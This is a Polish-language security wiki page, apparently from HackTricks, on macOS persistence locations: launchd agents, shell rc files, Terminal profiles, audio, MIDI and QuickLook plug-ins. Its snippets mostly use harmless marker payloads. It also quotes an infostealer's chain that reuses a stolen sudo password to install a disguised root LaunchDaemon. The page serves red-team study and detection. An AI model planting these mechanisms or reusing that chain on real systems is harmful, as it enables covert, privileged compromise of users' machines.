# Automatyczne uruchamianie w macOS

{{#include ../banners/hacktricks-training.md}}

Ta sekcja w dużej mierze opiera się na serii wpisów na blogu [**Beyond the good ol' LaunchAgents**](https://theevilbit.github.io/beyond/). Jej celem jest wskazanie lokalizacji, w których zapis pliku może doprowadzić do późniejszego wykonania kodu, zdarzenia wyzwalającego wykonanie oraz wymaganych uprawnień. Sama obecność lokalizacji nie dowodzi, że dany mechanizm jest włączony. Opisane poniżej lokalne testy przeprowadzono w systemie macOS 26.5.2 (5 października 2026 r.); nie potwierdzają one, że mechanizm działa tak samo w każdej wersji macOS.

> [!NOTE]
> „Wyzwalane zapisem” nie zawsze oznacza „uruchamiane zaraz po zapisaniu”. Niektóre lokalizacje są odczytywane dopiero podczas logowania, uruchamiania określonej aplikacji lub wykonywania przez użytkownika jakiejś czynności. Możliwość zapisu payloadu w już skonfigurowanym zadaniu to także coś innego niż uprawnienie do zarejestrowania nowego zadania. Zanim zastosujesz daną technikę, przetestuj ją na koncie testowym lub w VM.

## Obejście sandboxa

> [!TIP]
> Tutaj znajdziesz lokalizacje startowe przydatne do **obejścia sandboxa**, które pozwalają po prostu wykonać coś, **zapisując to w pliku** i **czekając** na bardzo **częstą** **czynność**, określoną **ilość czasu** albo **czynność, którą zwykle możesz wykonać** z poziomu sandboxa bez uprawnień root.

### Launchd

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacje

- **`/Library/LaunchAgents`**
  - **Wyzwalacz**: Logowanie użytkownika (lub jawna rejestracja)
  - Wymagany root
- **`/Library/LaunchDaemons`**
  - **Wyzwalacz**: Uruchomienie systemu (lub jawna rejestracja)
  - Wymagany root
- **`/System/Library/LaunchAgents`**
  - **Wyzwalacz**: Logowanie użytkownika; chroniona lokalizacja systemowa Apple
- **`/System/Library/LaunchDaemons`**
  - **Wyzwalacz**: Uruchomienie systemu; chroniona lokalizacja systemowa Apple
- **`~/Library/LaunchAgents`**
  - **Wyzwalacz**: Ponowne logowanie

`launchd` nie skanuje lokalizacji `~/Library/LaunchDaemons`. Zadania poszczególnych użytkowników należy umieszczać w `~/Library/LaunchAgents`; systemowy katalog daemonów to `/Library/LaunchDaemons`. [Przewodnik Apple dotyczący uruchamiania launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) opisuje skanowane lokalizacje.

> [!TIP]
> Ciekawostka: **`launchd`** ma wbudowaną listę właściwości w sekcji Mach-o `__Text.__config`, która zawiera inne dobrze znane usługi, które launchd musi uruchomić. Ponadto usługi te mogą zawierać klucze `RequireSuccess`, `RequireRun` i `RebootOnSuccess`, które oznaczają, że muszą zostać uruchomione i zakończyć działanie pomyślnie.
>
> Oczywiście nie można jej zmodyfikować z powodu podpisywania kodu.

#### Opis i wykorzystanie

**`launchd`** to **pierwszy** **proces** wykonywany przez jądro OS X podczas uruchamiania systemu i ostatni, który kończy działanie podczas jego zamykania. Powinien zawsze mieć **PID 1**. Proces ten **odczytuje i wykonuje** konfiguracje określone w plikach plist **ASEP** w lokalizacjach:

- `/Library/LaunchAgents`: Agenty poszczególnych użytkowników zainstalowane przez administratora
- `/Library/LaunchDaemons`: Daemony systemowe zainstalowane przez administratora
- `/System/Library/LaunchAgents`: Agenty poszczególnych użytkowników dostarczane przez Apple.
- `/System/Library/LaunchDaemons`: Daemony systemowe dostarczane przez Apple.

Gdy użytkownik się loguje, `launchd` ładuje pliki plist z katalogu `~/Library/LaunchAgents` tego użytkownika, korzystając z jego uprawnień. Zadania są uruchamiane zgodnie z ich kluczami; samo załadowanie pliku plist nie oznacza, że proces zostanie natychmiast uruchomiony.

**Główna różnica między agentami a daemonami polega na tym, że agenty są ładowane podczas logowania użytkownika, a daemony podczas uruchamiania systemu** (ponieważ niektóre usługi, takie jak ssh, muszą zostać uruchomione, zanim jakikolwiek użytkownik uzyska dostęp do systemu). Agenty mogą też korzystać z GUI, natomiast daemony muszą działać w tle.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Każdy element `ProgramArguments` jest osobnym argumentem; `launchd` nie interpretuje pojedynczego ciągu znaków jako polecenia powłoki. Poprawiony przykład powyżej można sprawdzić pod kątem składni bez jego ładowania, używając `plutil -lint /path/to/example.plist`. Więcej informacji znajdziesz w lokalnej stronie podręcznika `man launchd.plist`, w sekcjach `ProgramArguments`, `RunAtLoad` i `KeepAlive`.

#### Wyzwalacze zdarzeń dotyczących plików w istniejących zadaniach

**Już załadowany** agent lub demon może używać `WatchPaths`, aby uruchamiać się po zmianie wskazanej ścieżki. `QueueDirectories` uruchamia zadanie, gdy katalog nie jest pusty; `StartOnMount` uruchamia je po zamontowaniu woluminu. [Przewodnik Apple po launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) zawiera przykłady użycia `WatchPaths` i `QueueDirectories`. Zapis do obserwowanego pliku wyzwala **już skonfigurowane zadanie**; umożliwia wykonanie dowolnego kodu tylko wtedy, gdy zapisujący może również kontrolować plik wykonywalny zadania, skrypt lub dane interpretowane przez to zadanie. Samo zapisanie nowego pliku plist poza skanowaną lub zarejestrowaną lokalizacją nie powoduje jego załadowania.

Ten samoczyszczący się PoC rejestruje **tymczasowego agenta użytkownika** o unikatowej nazwie, modyfikuje tylko własny obserwowany plik, a następnie usuwa agenta. Został pomyślnie uruchomiony w systemie macOS 26.5.2 bez wylogowywania ani ponownego uruchamiania komputera:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Lokalne uruchomienie wypisało `watch fired: True`, a `bootout` zakończyło się powodzeniem. `launchctl bootstrap` jest tu używane wyłącznie w ramach odizolowanego PoC; **nie jest** potrzebne w przypadku już załadowanego zadania. Aby bezpiecznie ocenić istniejące zadanie, odczytaj jego plist i rozwiązaną ścieżkę `ProgramArguments`, a następnie sprawdź, czy odpowiedni plik wykonywalny lub interpretowany jest zapisywalny — nie modyfikując go.

Zdarza się, że **agent musi zostać uruchomiony przed zalogowaniem użytkownika** — takie agenty nazywa się **PreLoginAgents**. Jest to na przykład przydatne do zapewnienia technologii asystujących podczas logowania. Można je znaleźć również w `/Library/LaunchAgents` (zobacz [**tutaj**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) przykład).

> [!TIP]
> Nowe pliki konfiguracyjne Daemonów lub Agentów zostaną **załadowane po ponownym uruchomieniu albo przy użyciu** `launchctl load <target.plist>`. Można **również załadować pliki .plist bez tego rozszerzenia** za pomocą `launchctl -F <file>` (jednak te pliki plist nie zostaną automatycznie załadowane po ponownym uruchomieniu).\
> Można je też **wyładować** za pomocą `launchctl unload <target.plist>` (wskazywany przez nie proces zostanie zakończony),
>
> Aby **upewnić się**, że **nic** (np. nadpisanie) **nie uniemożliwia** **Agentowi** lub **Daemonowi** **uruchomienia**, wykonaj: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Wyświetl listę wszystkich agentów i daemonów załadowanych przez bieżącego użytkownika:

```bash
launchctl list
```

#### Przykładowy łańcuch złośliwego LaunchDaemon (ponowne użycie hasła)

Niedawny infostealer dla macOS ponownie wykorzystał **przechwycone hasło sudo**, aby zainstalować user agenta i LaunchDaemon działający jako root:<sup>[[1]](#references)</sup>

- Zapisz pętlę agenta w `~/.agent` i nadaj jej uprawnienia do wykonywania.
- Wygeneruj plist w `/tmp/starter`, wskazujący na tego agenta.
- Użyj ponownie skradzionego hasła z `sudo -S`, aby skopiować plik do `/Library/LaunchDaemons/com.finder.helper.plist`, ustawić właściciela i grupę na `root:wheel` oraz załadować go poleceniem `launchctl load`.
- Uruchom agenta po cichu za pomocą `nohup ~/.agent >/dev/null 2>&1 &`, aby odłączyć wyjście.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Plist demona umieszczony w `/Library/LaunchDaemons` nie staje się bezpieczny tylko dlatego, że przypisano go użytkownikowi. `launchd` wymaga odpowiedniego właściciela i uprawnień dla zadań systemowych i może odrzucić niezabezpieczony plist. Demon należący do roota zwykle działa jako root, chyba że jego konfiguracja wskazuje inne konto. Sprawdź `UserName`, `GroupName`, właściciela i diagnostykę `launchctl`; nie zakładaj, że nazwa właściciela plista wskazuje tożsamość procesu.

#### Więcej informacji o launchd

**`launchd`** to **pierwszy** proces w trybie użytkownika uruchamiany przez **jądro**. Uruchomienie procesu musi się **powieść**, a proces **nie może zakończyć działania ani ulec awarii**. Jest nawet **chroniony** przed niektórymi **sygnałami zabijającymi**.

Jedną z pierwszych czynności `launchd` jest **uruchomienie** wszystkich **demonów**, takich jak:

- **Demony czasowe** uruchamiane o określonych porach:
  - `com.apple.atrun.plist` wywołuje `/usr/libexec/atrun` z `StartInterval = 30` sekund w macOS 26.5.2; faktyczny stan włączenia może różnić się od wartości klucza `Disabled` w plista, ponieważ launchd przechowuje nadpisania oddzielnie.
  - `com.vix.cron.plist` wywołuje `/usr/sbin/cron`, gdy `/usr/lib/cron/tabs` zawiera zadania. `com.apple.systemstats.daily` to inna zaplanowana usługa, a nie demon cron.
- **Demony sieciowe**, takie jak:
  - `org.cups.cups-lpd`: Nasłuchuje przez TCP (`SockType: stream`) z `SockServiceName: printer`
    - SockServiceName musi być portem lub usługą z `/etc/services`
  - `com.apple.xscertd.plist`: Nasłuchuje przez TCP na porcie 1640
- **Demony ścieżek** uruchamiane po zmianie wskazanej ścieżki:
  - `com.apple.postfix.master`: Sprawdza ścieżkę `/etc/postfix/aliases`
- **Demony powiadomień IOKit**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Port Mach:**
  - `com.apple.xscertd-helper.plist`: Wpis `MachServices` wskazuje nazwę `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Działa inaczej niż poprzedni mechanizm. Powoduje, że launchd uruchamia aplikacje w odpowiedzi na określone zdarzenie. W tym przypadku głównym plikiem binarnym nie jest jednak `launchd`, lecz `/usr/libexec/UserEventAgent`. Ładuje on wtyczki z folderu objętego ograniczeniami SIP `/System/Library/UserEventPlugins/`, gdzie każda wtyczka określa swój inicjalizator w kluczu `XPCEventModuleInitializer` albo — w przypadku starszych wtyczek — w słowniku `CFPluginFactories` pod kluczem `FB86416D-6164-2070-726F-70735C216EC0` w pliku `Info.plist`.

### pliki startowe powłoki

Opis: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Opis (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Przydatne do obejścia sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Trzeba jednak znaleźć aplikację z TCC bypass, która uruchamia powłokę wczytującą te pliki

#### Lokalizacje

- **`~/.zshenv`** (lub nowszy, skompilowany plik **`~/.zshenv.zwc`**)
  - **Wyzwalacz**: Każde zwykłe uruchomienie zsh, w tym nieinteraktywne `zsh -c`; `zsh -f` pomija pliki startowe użytkownika.
- **`~/.zshrc`**
  - **Wyzwalacz**: Uruchomienie interaktywnego zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Wyzwalacz**: Uruchomienie logowania zsh; te pliki są odczytywane odpowiednio przed i po `.zshrc`.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Wyzwalacz**: Otwarcie terminala z zsh
  - Wymagany root
- **`~/.zlogout`**
  - **Wyzwalacz**: Normalne zakończenie logowania zsh, a nie zamknięcie dowolnego terminala lub powłoki.
- **`/etc/zlogout`**
  - **Wyzwalacz**: Zamknięcie terminala z zsh
  - Wymagany root
- Potencjalnie więcej informacji w: **`man zsh`**
- **`~/.bashrc`**
  - **Wyzwalacz**: Uruchomienie interaktywnego Bash **bez logowania**. Interaktywny Bash z logowaniem odczytuje ten plik tylko wtedy, gdy plik logowania jawnie go wczytuje.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Wyzwalacz**: Uruchomienie Bash z logowaniem; uruchamiany jest pierwszy istniejący plik z tej kolejności, który można odczytać. `~/.profile` jest pomijany, jeśli istnieje którykolwiek z dwóch wcześniejszych plików.
- **`/etc/profile`**
  - **Wyzwalacz**: Uruchomienie Bash z logowaniem; jego zmiana wymaga uprawnień roota.
- **`~/.tcshrc`** lub, gdy go nie ma, **`~/.cshrc`**
  - **Wyzwalacz**: Uruchomienie `tcsh`, w tym nieinteraktywnego `tcsh -c` na tym Macu. Użytkownik musi rzeczywiście wywołać `tcsh`; nie jest to domyślna powłoka macOS.
- **`~/.login`**
  - **Wyzwalacz**: Uruchomienie logowania `tcsh` po jego pliku rc.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Wyzwalacz**: Powinny być uruchamiane przez xterm, ale **nie jest on zainstalowany**, a nawet po instalacji pojawia się ten błąd: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Opis i wykorzystanie

Podczas uruchamiania środowiska powłoki, takiego jak `zsh` lub `bash`, **uruchamiane są określone pliki startowe**. Obecnie domyślną powłoką w macOS jest `/bin/zsh`. To, czy Terminal lub SSH uruchomi powłokę logowania albo interaktywną, zależy od konfiguracji; nie zakładaj, że każda sesja uruchamia wszystkie wymienione pliki. `bash` i `sh` również są dostępne w macOS, ale trzeba je jawnie wywołać, aby z nich skorzystać.<sup>[[2]](#references)</sup> [Dokumentacja plików startowych zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) opisuje kolejność, nadpisanie `ZDOTDIR` oraz regułę `.zwc`.

Poniższy eksperyment tylko do odczytu przeprowadzono w macOS 26.5.2, używając tymczasowego `ZDOTDIR`. Pokazuje, które pliki użytkownika zostały odczytane; nie zmieniono żadnego rzeczywistego pliku startowego powłoki:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Zaobserwowana kolejność była następująca: `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. `ZDOTDIR` musi już wskazywać alternatywny katalog; samo zapisanie plików w dowolnym katalogu nie wystarczy.

[Dokumentacja startowa Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) rozróżnia powłoki logowania od interaktywnych. Na maszynie testowej z macOS 26.5.2, w izolowanym katalogu `HOME` zawierającym wszystkie cztery pliki startowe użytkownika, uzyskano następujące wyniki: `bash -c` → żaden, `bash -ic` → `.bashrc`, `bash -lc` i `bash -lic` → tylko `.bash_profile`. Usunięcie `.bash_profile` sprawiło, że Bash logowania wczytał `.bash_login`, a następnie `.profile`, gdy usunięto również ten plik. `BASH_ENV` może wskazywać plik dla nieinteraktywnego Basha, ale ta zmienna środowiskowa musi być już ustawiona w procesie wywołującym. Jawne `exit` w Bashu logowania może również spowodować wczytanie `~/.bash_logout`.

Lokalna strona podręcznika `tcsh(1)` opisuje odrębną kolejność uruchamiania. Przy tymczasowym katalogu `HOME` polecenie `/bin/tcsh -c :` wczytało `.tcshrc` albo `.cshrc`, gdy `.tcshrc` nie istniał. Tymczasowa powłoka logowania `tcsh` wczytała `.tcshrc` i `.login`. Testy te utworzyły i usunęły wyłącznie pliki tymczasowe.

### Ponownie otwierane aplikacje

> [!CAUTION]
> Skonfigurowanie wskazanego mechanizmu exploita, wylogowanie i ponowne zalogowanie, a nawet ponowne uruchomienie komputera nie spowodowały uruchomienia aplikacji podczas testów. Aplikacja może już działać w chwili wykonywania tych czynności.

**Opis**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Lokalizacja

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Wyzwalacz**: Ponowne uruchomienie, które ponownie otwiera aplikacje

#### Opis i eksploatacja

Wszystkie aplikacje do ponownego otwarcia znajdują się w pliku plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Aby aplikacje otwierane ponownie uruchamiały własną aplikację, wystarczy **dodać ją do listy**.

UUID można znaleźć, wyświetlając zawartość tego katalogu lub używając polecenia `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Aby sprawdzić, które aplikacje zostaną ponownie otwarte, możesz wykonać:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Aby **dodać aplikację do tej listy**, możesz użyć:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Preferencje Terminala

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Przydatne do ominięcia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Ominięcie TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal używany z uprawnieniami FDA użytkownika

#### Lokalizacja

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Wyzwalacz**: Otwarcie nowego okna lub karty Terminala z użyciem profilu, którego ustawienia Shell zawierają polecenie startowe

#### Opis i wykorzystanie

W **`~/Library/Preferences`** są przechowywane preferencje aplikacji użytkownika. Niektóre z nich mogą zawierać konfigurację umożliwiającą **uruchamianie innych aplikacji/skryptów**.<sup>[[5]](#references)</sup>

Na przykład Terminal może wykonać polecenie podczas uruchamiania:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Ta konfiguracja jest odzwierciedlona w pliku **`~/Library/Preferences/com.apple.Terminal.plist`** w następujący sposób:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Jeśli odpowiedni profil zawiera polecenie startowe, a Terminal odczytuje to ustawienie, nowa sesja korzystająca z tego profilu może je wykonać. [Aktualny przewodnik Terminal firmy Apple](https://support.apple.com/guide/terminal/trmlshll/mac) opisuje polecenie **Powłoka → Uruchamianie** dla poszczególnych profili. Samo otwarcie Terminala bez nowej sesji korzystającej z tego profilu nie wystarczy. Poniższych zmian ustawień nie wprowadzono na Macu używanym do badań.

Możesz dodać to z poziomu CLI za pomocą:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Skrypty Terminala / inne rozszerzenia plików

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [✅](https://emojipedia.org/check-mark-button)
  - Terminal korzysta z uprawnień FDA użytkownika, który go używa

#### Lokalizacja

- **Dowolne miejsce**
  - **Wyzwalacz**: Otwarcie pliku `.terminal`, `.command` lub `.tool`

#### Opis i wykorzystanie

Jeśli użytkownik otworzy plik ustawień **`.terminal`**, Terminal może utworzyć sesję na podstawie jego profilu; pliki wykonywalne **`.command`** i **`.tool`** również mogą otwierać się w Terminalu. Jest to jawny wyzwalacz otwarcia pliku, a nie wykonanie kodu przez samo otwarcie Terminala. Dostęp TCC odziedziczony przez Terminal zależy od przyznanych mu uprawnień i wykonywanej operacji. Historyczny przykład poniżej nie został uruchomiony na komputerze Mac używanym do badań.

Wypróbuj:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

Możesz też użyć rozszerzeń **`.command`** i **`.tool`** z zawartością w postaci zwykłych skryptów powłoki — one również zostaną otwarte przez Terminal.

> [!CAUTION]
> Jeśli Terminal ma **Pełny dostęp do dysku**, będzie mógł wykonać tę czynność (pamiętaj, że wykonane polecenie będzie widoczne w oknie Terminala).

### Wtyczki audio

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Przydatne do bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

- **`/Library/Audio/Plug-Ins/HAL`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Serwer Core Audio ładuje zgodną wtyczkę urządzenia HAL; ponowne uruchomienie serwera może spowodować jej ponowne wykrycie
- **`/Library/Audio/Plug-ins/Components`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: Host audio wykrywa i inicjuje zainstalowany Audio Unit
- **`~/Library/Audio/Plug-ins/Components`**
  - **Wyzwalacz**: Host audio wykrywa i inicjuje zainstalowany Audio Unit
- **`/System/Library/Components`**
  - Lokalizacja dostarczana przez Apple, chroniona przez system
  - **Wyzwalacz**: Host audio inicjuje pasujący komponent systemowy

#### Opis

Zgodnie z poprzednimi writeupami można **skompilować niektóre wtyczki audio** i doprowadzić do ich załadowania.<sup>[[6]](#references)[[7]](#references)</sup>

Wtyczki urządzeń HAL i Audio Units są ładowane na różne sposoby. [Przewodnik Apple dotyczący hostowania Audio Unit](https://developer.apple.com/library/archive/documentation/MusicAudio/Conceptual/CoreAudioOverview/ARoadmaptoCommonTasks/ARoadmaptoCommonTasks.html) wyjaśnia, że host musi znaleźć komponent i go zainicjować; samo skopiowanie go do katalogu skanowania lub ponowne uruchomienie `coreaudiod` nie dowodzi, że został uruchomiony. Wtyczki AUv2 działają w procesie hosta, natomiast [aktualne wytyczne Apple dotyczące Audio Unit](https://developer.apple.com/documentation/audiotoolbox/incorporating-audio-effects-and-instruments) wskazują, że AUv3 domyślnie działa w osobnym procesie w macOS. Wymogi dotyczące podpisu, sandboxa i walidacji bibliotek zależą od hosta. Na komputerze Mac używanym do badań nie zainstalowano ani nie uruchomiono żadnej wtyczki audio.

### Sterowniki CoreMIDI (MIDIServer)

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- Przydatne do bypass sandbox: [✅](https://emojipedia.org/check-mark-button)
  - Twój kod działa wewnątrz procesu `MIDIServer`, a nie w sandboxie Twojej aplikacji
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - `MIDIServer` działa we własnym profilu sandboxa `seatbelt`

#### Lokalizacja

- **`~/Library/Audio/MIDI Drivers/*.plugin`**
  - Uprawnienia root nie są wymagane (katalog z prawem zapisu dla użytkownika)
  - **Wyzwalacz**: `MIDIServer` uruchamia się lub restartuje. Jest uruchamiany na żądanie przy pierwszym użyciu CoreMIDI przez dowolny proces (otwarcie *Konfiguracji MIDI Audio*, GarageBand, DAW lub strony korzystającej z WebMIDI)
- **`/Library/Audio/MIDI Drivers/*.plugin`**
  - Wymagane uprawnienia root
  - **Wyzwalacz**: jak wyżej

#### Opis i wykorzystanie

`MIDIServer` firmy Apple (`/System/Library/Frameworks/CoreMIDI.framework/MIDIServer`) ładuje pakiety **sterowników** MIDI z katalogów `Audio/MIDI Drivers`. Plik binarny jest podpisany przez Apple, ale ma uprawnienie `com.apple.security.cs.disable-library-validation`, dzięki czemu załaduje pakiet, który jest **niepodpisany lub podpisany ad hoc przez inny zespół**. Umożliwia to wykonanie kodu w osobnym procesie należącym do Apple **bez uprawnień root**.<sup>[[53]](#references)</sup>

Zweryfikowano w macOS 26 (tylko do odczytu):

```bash
# user-writable, no root needed
ls -ld ~/Library/"Audio/MIDI Drivers"            # exists, owned by the user
codesign -d --entitlements :- /System/Library/Frameworks/CoreMIDI.framework/MIDIServer 2>/dev/null \
  | grep disable-library-validation              # -> com.apple.security.cs.disable-library-validation
```

Sterownik to standardowy bundle eksportujący fabrykę `MIDIDriverInterface`; umieszczenie payloadu w fabryce/konstruktorze sprawi, że uruchomi się on, gdy `MIDIServer` wyliczy sterowniki. Zbuduj go, umieść jako `~/Library/Audio/MIDI Drivers/Evil.plugin`, a następnie wyzwól jego załadowanie bez wylogowywania się ani ponownego uruchamiania:

```bash
# starts MIDIServer, which scans the driver directories
open -a "Audio MIDI Setup"
```

### Wtyczki QuickLook

Writeup: [https://theevilbit.github.io/beyond/beyond_0012/](https://theevilbit.github.io/beyond/beyond_0012/)<sup>[[8]](#references)</sup>

- Przydatne do obejścia sandboxa: [✅](https://emojipedia.org/check-mark-button)
- Obejście TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Możesz uzyskać dodatkowy dostęp TCC

#### Lokalizacja

- `/System/Library/QuickLook`
- `/Library/QuickLook`
- `~/Library/QuickLook`
- `/Applications/AppNameHere/Contents/Library/QuickLook/`
- `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### Opis i wykorzystanie

Wtyczki QuickLook mogą zostać uruchomione, gdy **wywołasz podgląd pliku** (naciśniesz spację, gdy plik jest zaznaczony w Finderze) i zainstalowana jest **wtyczka obsługująca ten typ pliku**.<sup>[[8]](#references)</sup>

Możesz skompilować własną wtyczkę QuickLook, umieścić ją w jednej z wcześniej wymienionych lokalizacji, aby ją załadować, a następnie przejść do obsługiwanego pliku i nacisnąć spację, aby ją uruchomić.

